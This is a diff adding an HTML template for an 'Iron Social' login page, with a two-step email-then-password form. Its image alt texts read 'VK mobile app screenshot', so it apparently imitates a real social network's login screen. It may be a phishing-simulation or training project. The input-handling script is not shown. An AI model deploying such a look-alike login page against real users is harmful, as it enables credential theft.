@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iron Social </title>
+
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles2.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>IronSocial for mobile devices</h1>
+            <p>Install our official mobile app and stay in touch with your friends anytime and anywhere.</p>
+            <div class="app-images">
+                <img src="{{ url_for('static', filename='img/phone1.png') }}" alt="VK mobile app screenshot 1">
+                <img src="{{ url_for('static', filename='img/phone2.png') }}" alt="VK mobile app screenshot 2">
+            </div>
+          
+        </div>
+        <div class="right-section">
+            <h1>IronSocial for mobile devices</h1>
+            <div class="login-box" id="email-form">
+                <h2>Sign in to Iron Social</h2>
+                <input type="email"   id="email"  placeholder="email">
+                <div class="checkbox">
+                    <input type="checkbox"  id="saveUser" >
+                    <label for="saveUser">Save user</label>
+                    <button id="next-btn">Siguiente</button>
+                </div>
+
+              
+                <button>Sign in</button>
+                
+                <button type="submit" class="sign-up">Sign up</button>
+                
+            </div>
+
+            
+
+
+        
+                
+            </div>
+
+            <div id="password-form" style="display:none;">
+                <button id="back-btn">←</button>
+                <h2>Introduce tu contraseña</h2>
+                <p id="email-display"></p>
+                <input type="password" id="password" placeholder="Introduce tu contraseña" required>
+                <button id="login-btn">Continuar</button>
+                <p><a href="#">¿Olvidaste la contraseña o aún no la configuraste?</a></p>
+            </div>
+
+
+
+
+
+
+
+
+
+        </div>
+    </div>
+    <footer>
+        <p>Iron Social © 2024. Todos los derechos reservados.</p>
+        <div class="footer-links">
+            <a href="#">About IronSocial    </a>
+            <a href="#">Terms</a>
+           <a href="https://github.com/ciberzerone/ironSocial">Developers: ciberzerone</a>
+        </div>
+      
+    </footer>
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
+
